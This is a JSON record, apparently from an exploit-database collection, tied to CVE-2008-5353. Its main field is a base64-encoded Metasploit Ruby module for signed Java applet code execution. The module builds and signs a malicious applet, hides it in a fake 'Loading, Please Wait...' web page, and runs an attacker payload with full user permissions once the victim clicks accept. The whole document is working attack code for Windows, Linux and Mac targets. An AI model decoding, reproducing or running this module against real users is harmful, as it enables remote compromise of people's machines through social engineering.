{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgJElkOiBqYXZhX3NpZ25lZF9hcHBsZXQucmIgMTE1MTYgMjAxMS0wMS0wOCAwMToxMzoyNlogamR1Y2sgJA0KIyMNCg0KIyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgRnJhbWV3b3JrIHdlYiBzaXRlIGZvciBtb3JlIGluZm9ybWF0aW9uIG9uIGxpY2Vuc2luZyBhbmQgdGVybXMgb2YgdXNlLg0KIyBodHRwOi8vbWV0YXNwbG9pdC5jb20vZnJhbWV3b3JrLw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQpyZXF1aXJlICdyZXgnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCglSYW5rID0gRXhjZWxsZW50UmFua2luZw0KDQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cFNlcnZlcjo6SFRNTA0KCWluY2x1ZGUgTXNmOjpFeHBsb2l0OjpKYXZhDQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkVYRQ0KDQoJZGVmIGluaXRpYWxpemUoIGluZm8gPSB7fSApDQoJCXN1cGVyKCB1cGRhdGVfaW5mbyggaW5mbywNCgkJCSdOYW1lJyAgICAgICAgICA9PiAnU2lnbmVkIEFwcGxldCBTb2NpYWwgRW5naW5lZXJpbmcgQ29kZSBFeGVjJywNCgkJCSdEZXNjcmlwdGlvbicgICA9PiAlcXsNCgkJCQkJVGhpcyBleHBsb2l0IGR5bmFtaWNhbGx5IGNyZWF0ZXMgYW4gYXBwbGV0IHZpYSB0aGUgTXNmOjpFeHBsb2l0OjpKYXZhIG1peGluLCBjb252ZXJ0cyBpdA0KCQkJCXRvIGEgLmphciBmaWxlLCB0aGVuIHNpZ25zIHRoZSAuamFyIHdpdGggYSBkeW5hbWljYWxseSBjcmVhdGVkIGNlcnRpZmljYXRlIGNvbnRhaW5pbmcNCgkJCQl2YWx1ZXMgb2YgeW91ciBjaG9vc2luZy4gIFRoaXMgaXMgcHJlc2VudGVkIHRvIHRoZSBlbmQgdXNlciB2aWEgYSB3ZWIgcGFnZSB3aXRoIGFuIGFwcGxldA0KCQkJCXRhZywgbG9hZGluZyB0aGUgc2lnbmVkIGFwcGxldC4NCg0KCQkJCVRoZSB1c2VyJ3MgSlZNIHBvcHMgYSBkaWFsb2cgYXNraW5nIGlmIHRoZXkgdHJ1c3QgdGhlIHNpZ25lZCBhcHBsZXQgYW5kIGRpc3BsYXlzIHRoZQ0KCQkJCXZhbHVlcyBjaG9zZW4uICBPbmNlIHRoZSB1c2VyIGNsaWNrcyAnYWNjZXB0JywgdGhlIGFwcGxldCBleGVjdXRlcyB3aXRoIGZ1bGwgdXNlcg0KCQkJCXBlcm1pc3Npb25zLg0KDQoJCQkJVGhlIGphdmEgcGF5bG9hZCB1c2VkIGluIHRoaXMgZXhwbG9pdCBpcyBkZXJpdmVkIGZyb20gU3RlcGhlbiBGZXdlcidzIGFuZCBIRE0ncyBwYXlsb2FkDQoJCQkJY3JlYXRlZCBmb3IgdGhlIENWRS0yMDA4LTUzNTMgamF2YSBkZXNlcmlhbGl6YXRpb24gZXhwbG9pdC4NCg0KCQkJCVRoaXMgbW9kdWxlIHJlcXVpcmVzIHRoZSByamIgcnVieWdlbSwgdGhlIEpESywgYW5kIHRoZSAkSkFWQV9IT01FIHZhcmlhYmxlIHRvIGJlIHNldC4NCgkJCQlJZiB0aGVzZSBkZXBlbmRlbmNpZXMgYXJlIG5vdCBwcmVzZW50LCB0aGUgZXhwbG9pdCBmYWxscyBiYWNrIHRvIGEgc3RhdGljLCBzaWduZWQNCgkJCQlKQVIuDQoJCQl9LA0KCQkJJ0xpY2Vuc2UnICAgICAgID0+IE1TRl9MSUNFTlNFLA0KCQkJJ0F1dGhvcicgICAgICAgID0+IFsgJ25hdHJvbicgXSwNCgkJCSdWZXJzaW9uJyAgICAgICA9PiAnJFJldmlzaW9uOiAxMTUxNiAkJywNCgkJCSdSZWZlcmVuY2VzJyAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnVVJMJywgJ2h0dHA6Ly93d3cuZGVmY29uLm9yZy9pbWFnZXMvZGVmY29uLTE3L2RjLTE3LXByZXNlbnRhdGlvbnMvZGVmY29uLTE3LXZhbHNtaXRoLW1ldGFwaGlzaC5wZGYnIF0NCgkJCQldLA0KCQkJJ1BsYXRmb3JtJyAgICAgID0+IFsgJ2phdmEnLCAnd2luJywgJ29zeCcsICdsaW51eCcsICdzb2xhcmlzJyBdLA0KCQkJJ1BheWxvYWQnICAgICAgID0+IHsgJ0JhZENoYXJzJyA9PiAnJywgJ0Rpc2FibGVOb3BzJyA9PiB0cnVlIH0sDQoJCQknVGFyZ2V0cycgICAgICAgPT4NCgkJCQlbDQoJCQkJCVsgJ0dlbmVyaWMgKEphdmEgUGF5bG9hZCknLA0KCQkJCQkJew0KCQkJCQkJCSdQbGF0Zm9ybScgPT4gWydqYXZhJ10sDQoJCQkJCQkJJ0FyY2gnID0+IEFSQ0hfSkFWQQ0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCQlbICdXaW5kb3dzIHg4NiAoTmF0aXZlIFBheWxvYWQpJywNCgkJCQkJCXsNCgkJCQkJCQknUGxhdGZvcm0nID0+ICd3aW4nLA0KCQkJCQkJCSdBcmNoJyA9PiBBUkNIX1g4NiwNCgkJCQkJCX0NCgkJCQkJXSwNCgkJCQkJWyAnTGludXggeDg2IChOYXRpdmUgUGF5bG9hZCknLA0KCQkJCQkJew0KCQkJCQkJCSdQbGF0Zm9ybScgPT4gJ2xpbnV4JywNCgkJCQkJCQknQXJjaCcgPT4gQVJDSF9YODYsDQoJCQkJCQl9DQoJCQkJCV0sDQoJCQkJCVsgJ01hYyBPUyBYIFBQQyAoTmF0aXZlIFBheWxvYWQpJywNCgkJCQkJCXsNCgkJCQkJCQknUGxhdGZvcm0nID0+ICdvc3gnLA0KCQkJCQkJCSdBcmNoJyA9PiBBUkNIX1BQQywNCgkJCQkJCX0NCgkJCQkJXSwNCgkJCQkJWyAnTWFjIE9TIFggeDg2IChOYXRpdmUgUGF5bG9hZCknLA0KCQkJCQkJew0KCQkJCQkJCSdQbGF0Zm9ybScgPT4gJ29zeCcsDQoJCQkJCQkJJ0FyY2gnID0+IEFSQ0hfWDg2LA0KCQkJCQkJfQ0KCQkJCQldDQoJCQkJXSwNCgkJCSdEZWZhdWx0VGFyZ2V0JyA9PiAxDQoJCSkpDQoJCXJlZ2lzdGVyX29wdGlvbnMoDQoJCQlbDQoJCQkJT3B0U3RyaW5nLm5ldyggICAgICdDRVJUQ04nLCAJWyB0cnVlLCAiVGhlIENOPSB2YWx1ZSBmb3IgdGhlIGNlcnRpZmljYXRlLiIsICJNZXRhc3Bsb2l0IEluYy4iIF0pLA0KCQkJCU9wdFN0cmluZy5uZXcoICdBUFBMRVROQU1FJywJWyB0cnVlLCAiVGhlIG1haW4gYXBwbGV0J3MgY2xhc3MgbmFtZS4iLCAgICAgICJTaXRlTG9hZGVyIgkJXSksDQoJCQkJI09wdFN0cmluZy5uZXcoJ1BBWUxPQUROQU1FJywJWyB0cnVlLCAiVGhlIHBheWxvYWQgY2xhc3NlcyBuYW1lLiIsIAkgICAgICAiU2l0ZVN1cHBvcnQiIAldKSwNCg0KCQkJCSMgTm90IGltcGxlbWVudGVkIHlldC4NCgkJCQkjT3B0U3RyaW5nLm5ldygnUEFDS0FHRU5BTUUnLAlbIHRydWUsICJUaGUgcGFja2FnZSBuYW1lIGZvciBnZW4nZCBjbGFzc2VzLiIsIngiCQldKSwNCgkJCQkjIE5lZWRzIFJleDo6WmlwIHRvIGJlIGFibGUgdG8gY3JhY2sgemlwIGZpbGVzDQoJCQkJI09wdFN0cmluZy5uZXcoJ0NVU1RPTUpBUicsIAlbIGZhbHNlLCAiQSBjdXN0b20gLmphciBhcHBsZXQgdG8gdXNlLiIsIG5pbF0pLA0KCQkJXSwgc2VsZi5jbGFzcykNCgkJIyBObyBzb3VyY2UgcmlnaHQgbm93LCBzbyBkb24ndCBnaXZlIGFuIG9wdGlvbiB0byBzYXZlIGl0DQoJCSNyZWdpc3Rlcl9hZHZhbmNlZF9vcHRpb25zKA0KCQkjCVsNCgkJIwkJT3B0U3RyaW5nLm5ldygnU2F2ZVRvRmlsZScsCQlbIGZhbHNlLCAiV2hlbiBzZXQsIHNvdXJjZSBpcyBzYXZlZCB0byB0aGlzIGRpcmVjdG9yeSB1bmRlciBleHRlcm5hbC9zb3VyY2UvIiwgbmlsIF0pDQoJCSMJXSwgc2VsZi5jbGFzcykNCgllbmQNCg0KCWRlZiBleHBsb2l0DQoJCSMNCgkJIyBDdXJyZW50bHkgZG9pbmcgYWxsIHByb2Nlc3NpbmcgaW4gb25fcmVxdWVzdF91cmkuDQoJCSMgSWYgdGhpcyBpcyB0b28gc2xvdywgd2UgY2FuIG1vdmUgYXBwbGV0IGdlbmVyYXRpb24gdXAgaGVyZS4NCgkJIw0KDQoJCUB1c2Vfc3RhdGljID0gZmFsc2UNCgkJaWYgbm90IEBqdm1faW5pdA0KCQkJcHJpbnRfZXJyb3INCgkJCXByaW50X2Vycm9yICJUaGUgSkRLIGZhaWxlZCB0byBpbml0aWFsaXplZDogI3tAamF2YV9lcnJvcn0iDQoJCQlwcmludF9lcnJvciAiSW4gb3JkZXIgdG8gZHluYW1pY2FsbHkgc2lnbiB0aGUgYXBwbGV0LCB5b3UgbXVzdCBpbnN0YWxsIHRoZSBKYXZhIERldmVsb3BtZW50IEtpdCwgdGhlIHJqYiBnZW0sIGFuZCBzZXQgdGhlIEpBVkFfSE9NRSBlbnZpcm9ubWVudCB2YXJpYWJsZS4iDQoJCQlwcmludF9lcnJvcg0KCQkJcHJpbnRfZXJyb3IgIkZhbGxpbmcgYmFjayB0byBzdGF0aWMgc2lnbmVkIGFwcGxldC4gIFRoaXMgZXhwbG9pdCB3aWxsIHN0aWxsIHdvcmssIGJ1dCB0aGUgQ0VSVENOIGFuZCBBUFBMRVROQU1FIHZhcmlhYmxlcyB3aWxsIGJlIGlnbm9yZWQuIg0KCQkJcHJpbnRfZXJyb3INCg0KCQkJQHVzZV9zdGF0aWMgPSB0cnVlDQoJCWVsc2UNCgkJCWNwID0gIiN7ZGF0YXN0b3JlWyJKYXZhQ2FjaGUiXX06IiArIEZpbGUuam9pbihNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgImphdmEiKQ0KCQkJY29tcGlsZSggWyAiI3tkYXRhc3RvcmVbIkFQUExFVE5BTUUiXX0iIF0gLCBbIGFwcGxldF9jb2RlIF0sIFsgIi1jbGFzc3BhdGgiLCAiI3tjcH0iIF0pDQoJCQlhcHBsZXRfZmlsZSA9IEZpbGUuam9pbihkYXRhc3RvcmVbIkphdmFDYWNoZSJdLCAiI3tkYXRhc3RvcmVbIkFQUExFVE5BTUUiXX0uY2xhc3MiKQ0KCQkJQGNvbXBpbGVkX2FwcGxldF9kYXRhID0gRmlsZS5vcGVuKGFwcGxldF9maWxlLCAicmIiKSB7IHxmfCBmLnJlYWQoZi5zdGF0LnNpemUpIH0NCgkJZW5kDQoNCgkJc3VwZXINCgllbmQNCg0KCWRlZiBvbl9yZXF1ZXN0X3VyaSggY2xpLCByZXF1ZXN0ICkNCgkJcGF5bG9hZCA9IHJlZ2VuZXJhdGVfcGF5bG9hZChjbGkpDQoJCWlmIG5vdCBwYXlsb2FkDQoJCQlwcmludF9lcnJvciggIkZhaWxlZCB0byBnZW5lcmF0ZSB0aGUgcGF5bG9hZC4iICkNCgkJCSMgU2VuZCB0aGVtIGEgNDA0IHNvIHRoZSBicm93c2VyIGRvZXNuJ3QgaGFuZyB3YWl0aW5nIGZvciBkYXRhDQoJCQkjIHRoYXQgd2lsbCBuZXZlciBjb21lLg0KCQkJc2VuZF9ub3RfZm91bmQoY2xpKQ0KCQkJcmV0dXJuDQoJCWVuZA0KDQoJCWlmIG5vdCByZXF1ZXN0LnVyaS5tYXRjaCgvXC5qYXIkL2kpDQoJCQlpZiBub3QgcmVxdWVzdC51cmkubWF0Y2goL1wvJC8pDQoJCQkJc2VuZF9yZWRpcmVjdCggY2xpLCBnZXRfcmVzb3VyY2UoKSArICcvJywgJycpDQoJCQkJcmV0dXJuDQoJCQllbmQNCg0KCQkJcHJpbnRfc3RhdHVzKCAiSGFuZGxpbmcgcmVxdWVzdCBmcm9tICN7Y2xpLnBlZXJob3N0fToje2NsaS5wZWVycG9ydH0uLi4iICkNCg0KCQkJc2VuZF9yZXNwb25zZV9odG1sKCBjbGksIGdlbmVyYXRlX2h0bWwsIHsgJ0NvbnRlbnQtVHlwZScgPT4gJ3RleHQvaHRtbCcgfSApDQoJCQlyZXR1cm4NCgkJZW5kDQoNCgkJIyBJZiB3ZSBoYXZlbid0IHJldHVybmVkIHlldCwgdGhlbiB0aGlzIGlzIGEgcmVxdWVzdCBmb3Igb3VyIGFwcGxldA0KCQkjIGphciwgYnVpbGQgb25lIGZvciB0aGlzIHZpY3RpbS4NCg0KCQlqYXIgPSBwYXlsb2FkLmVuY29kZWRfamFyDQoNCgkJaWYgQHVzZV9zdGF0aWMNCgkJCSMgVGhlbiBidWlsZCBmcm9tIHRoZSBzdGF0aWNhbGx5IHNpZ25lZCBjbGFzcyBmaWxlcy4gIE5vdGUgdGhhdA0KCQkJIyB0aGlzIHVzZXMgYSBwcmUtY29tcGlsZWQgdmVyc2lvbiBvZiBQYXlsb2FkLmNsYXNzLCBzbyBhbnkgbmV3DQoJCQkjIHVwZGF0ZXMgdG8gdGhhdCBmaWxlIGluIHRoZSBub3JtYWwgamF2YXBheWxvYWQgd2lsbCBub3QgYmUNCgkJCSMgcmVmbGVjdGVkIGhlcmUhDQoJCQlhcHBsZXRfZmlsZSA9IEZpbGUuam9pbihNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgImV4cGxvaXRzIiwgImphdmFfc2lnbmVkX2FwcGxldCIsICJTaXRlTG9hZGVyLmNsYXNzIikNCgkJCWFwcGxldF9kYXRhID0gRmlsZS5vcGVuKGFwcGxldF9maWxlLCAicmIiKSB7IHxmfCBmLnJlYWQoZi5zdGF0LnNpemUpIH0NCgkJCWphci5hZGRfZmlsZSgiU2l0ZUxvYWRlci5jbGFzcyIsIGFwcGxldF9kYXRhKQ0KDQoJCQlwcmludF9zdGF0dXMoIkJ1aWxkaW5nIHN0YXRpY2FsbHkgc2lnbmVkIGphciBmb3IgI3tjbGkucGVlcmhvc3R9IikNCgkJCWJ1aWxkX3N0YXRpY19zaWcoamFyKQ0KCQkJZGF0YSA9IGphci50b19zDQoJCWVsc2UNCgkJCSMgVGhlbiBidWlsZCBmcm9tIHRoZSBjbGFzcyBmaWxlIHdlIGNvbXBpbGVkIGluIHRoZSBleHBsb2l0KCkNCgkJCSMgbWV0aG9kIGFib3ZlLg0KCQkJamFyLmFkZF9maWxlKCIje2RhdGFzdG9yZVsiQVBQTEVUTkFNRSJdfS5jbGFzcyIsIEBjb21waWxlZF9hcHBsZXRfZGF0YSkNCgkJCXByaW50X3N0YXR1cygiU2lnbmluZyBmaWxlIGZvciAje2NsaS5wZWVyaG9zdH0iKQ0KCQkJIyBUaGUgUkpCIHNpZ25pbmcgY2xhc3MgcmVxdWlyZXMgdGhlIGphciB0byBiZSBhbiBhY3R1YWwgZmlsZSBvbg0KCQkJIyB0aGUgZmlsZXN5c3RlbSwgd3JpdGUgaXQgb3V0Lg0KCQkJRmlsZS5vcGVuKEZpbGUuam9pbihkYXRhc3RvcmVbIkphdmFDYWNoZSJdLCAidG1wLmphciIpLCAnd2InKSB7IHxmfCBmLndyaXRlKGphci50b19zKSB9DQoJCQlzaWduX2phcihkYXRhc3RvcmVbIkNFUlRDTiJdLCAidG1wLmphciIsICJzaWduZWQuamFyIikNCgkJCSMgLi4uIGFuZCByZWFkIGluIHRoZSByZXN1bHRpbmcgc2lnbmVkIGphcg0KCQkJZGF0YSA9IEZpbGUub3BlbihGaWxlLmpvaW4oZGF0YXN0b3JlWyJKYXZhQ2FjaGUiXSwgInNpZ25lZC5qYXIiKSwgInJiIikgeyB8ZnwgZi5yZWFkKGYuc3RhdC5zaXplKSB9DQoJCWVuZA0KDQoJCXByaW50X3N0YXR1cyggIlNlbmRpbmcgI3tkYXRhc3RvcmVbJ0FQUExFVE5BTUUnXX0uamFyIHRvICN7Y2xpLnBlZXJob3N0fToje2NsaS5wZWVycG9ydH0uICBXYWl0aW5nIGZvciB1c2VyIHRvIGNsaWNrICdhY2NlcHQnLi4uIiApDQoJCXNlbmRfcmVzcG9uc2UoIGNsaSwgZGF0YS50b19zLCB7ICdDb250ZW50LVR5cGUnID0+ICJhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iIH0gKQ0KDQoJCWhhbmRsZXIoIGNsaSApDQoNCgllbmQNCg0KCWRlZiBnZW5lcmF0ZV9odG1sDQoJCWh0bWwgID0gJVF8PGh0bWw+PGhlYWQ+PHRpdGxlPkxvYWRpbmcsIFBsZWFzZSBXYWl0Li4uPC90aXRsZT48L2hlYWQ+IHwNCgkJaHRtbCArPSAlUXw8Ym9keT48Y2VudGVyPjxwPkxvYWRpbmcsIFBsZWFzZSBXYWl0Li4uPC9wPjwvY2VudGVyPiB8DQoJCWh0bWwgKz0gJVF8PGFwcGxldCBhcmNoaXZlPSIje2RhdGFzdG9yZVsiQVBQTEVUTkFNRSJdfS5qYXIiXG58DQoJCWlmIEB1c2Vfc3RhdGljDQoJCQlodG1sICs9ICVRfCAgY29kZT0iU2l0ZUxvYWRlciIgd2lkdGg9IjEiIGhlaWdodD0iMSI+XG58DQoJCWVsc2UNCgkJCWh0bWwgKz0gJVF8ICBjb2RlPSIje2RhdGFzdG9yZVsiQVBQTEVUTkFNRSJdfSIgd2lkdGg9IjEiIGhlaWdodD0iMSI+XG58DQoJCWVuZA0KCQlodG1sICs9ICVRfDwvYXBwbGV0PjwvYm9keT48L2h0bWw+fA0KCQlyZXR1cm4gaHRtbA0KCWVuZA0KDQoJZGVmIGJ1aWxkX3N0YXRpY19zaWcoamFyKQ0KCQlmaWxlcyA9IFsNCgkJCSJtZXRhc3Bsb2l0L1BheWxvYWQuY2xhc3MiLA0KCQkJIlNpdGVMb2FkZXIuY2xhc3MiLA0KCQkJIk1FVEEtSU5GL01BTklGRVNULk1GIiwNCgkJCSJNRVRBLUlORi9TSUdORklMRS5SU0EiLA0KCQkJIk1FVEEtSU5GL1NJR05GSUxFLlNGIiwNCgkJXQ0KDQoJCSMgR2hldHRvLiAgUmVwbGFjZSBleGlzdGluZyBmaWxlcyBpbiB0aGUgSmFyLCB0aGVuIGFkZCBpbg0KCQkjIGFueXRoaW5nIHRoYXQgd2Fzbid0IHJlcGxhY2VkLiAgVGhlIHJlYXNvbiBmb3IgcmVwbGFjaW5nIHRoZQ0KCQkjIC5jbGFzcyBmaWxlcyBpcyB0byBlbnN1cmUgdGhhdCB3ZSdyZSBzZW5kaW5nIHRoZQ0KCQkjIFBheWxvYWQuY2xhc3MgYXMgd2FzIHNpZ25lZCByYXRoZXIgdGhhbiBhIG5ld2VyIG9uZSB0aGF0IHdhcw0KCQkjIHVwZGF0ZWQgd2l0aG91dCB1cGRhdGluZyB0aGUgc2lnbmF0dXJlLiAgV2UnbGwganVzdCBoYXZlIHRvDQoJCSMgY3Jvc3Mgb3VyIGZpbmdlcnMgYW5kIGhvcGUgdGhhdCBhbnkgdXBkYXRlcyBkb24ndCBicmVhaw0KCQkjIGJhY2t3YXJkcyBjb21wYXRpYmlsaXR5IGluIHRoZSBoYW5kbGVyIHVudGlsIHdlIGNhbiBnZXQNCgkJIyBzaWduaW5nIHRvIHdvcmsgZnJvbSBydWJ5LiAgT25jZSB3ZSBjYW4gc2lnbiBqYXJzIGRpcmVjdGx5DQoJCSMgZnJvbSBydWJ5IHVzaW5nIE9wZW5TU0wsIHRoaXMgd29uJ3QgYmUgYSBwcm9ibGVtLg0KCQlyZXBsYWNlZCA9IFtdDQoJCSMgUmVwbGFjZSB0aGUgb25lcyB0aGF0IGFyZSBhbHJlYWR5IHRoZXJlLg0KCQlqYXIuZW50cmllcy5tYXAgZG8gfGV8DQoJCQlmaWxlID0gRmlsZS5qb2luKE1zZjo6Q29uZmlnLmRhdGFfZGlyZWN0b3J5LCAiZXhwbG9pdHMiLCAiamF2YV9zaWduZWRfYXBwbGV0IiwgZS5uYW1lKQ0KCQkJaWYgRmlsZS5maWxlPyBmaWxlDQoJCQkJRmlsZS5vcGVuKGZpbGUsICJyYiIpIGRvIHxmfA0KCQkJCQllLmRhdGEgPSBmLnJlYWQoZi5zdGF0LnNpemUpDQoJCQkJZW5kDQoJCQllbmQNCgkJCXJlcGxhY2VkIDw8IGUubmFtZQ0KCQllbmQNCgkJIyBBZGQgdGhlIHJlc3QNCgkJZmlsZXMuZWFjaCB7IHxlfA0KCQkJbmV4dCBpZiByZXBsYWNlZC5pbmNsdWRlPyBlDQoJCQlmaWxlID0gRmlsZS5qb2luKE1zZjo6Q29uZmlnLmRhdGFfZGlyZWN0b3J5LCAiZXhwbG9pdHMiLCAiamF2YV9zaWduZWRfYXBwbGV0IiwgZSkNCgkJCUZpbGUub3BlbihmaWxlLCAicmIiKSBkbyB8ZnwNCgkJCQlqYXIuYWRkX2ZpbGUoZSwgZi5yZWFkKGYuc3RhdC5zaXplKSkNCgkJCWVuZA0KCQl9DQoNCgkJamFyDQoJZW5kDQoNCglkZWYgYXBwbGV0X2NvZGUNCgkJYXBwbGV0ID0gPDwtRU9TDQppbXBvcnQgamF2YS5hcHBsZXQuKjsNCmltcG9ydCBtZXRhc3Bsb2l0Lio7DQoNCnB1YmxpYyBjbGFzcyAje2RhdGFzdG9yZVsiQVBQTEVUTkFNRSJdfSBleHRlbmRzIEFwcGxldCB7DQoJcHVibGljIHZvaWQgaW5pdCgpIHsNCgkJdHJ5IHsNCgkJCVBheWxvYWQubWFpbihudWxsKTsNCgkJfSBjYXRjaCAoRXhjZXB0aW9uIGV4KSB7DQoJCQkvL2V4LnByaW50U3RhY2tUcmFjZSgpOw0KCQl9DQoJfQ0KfQ0KRU9TDQoJZW5kDQplbmQ=", 
    "filename": "platforms/multiple/remote/16302.rb", 
    "id": "16302", 
    "cves": [
        "CVE-2008-5353"
    ]
}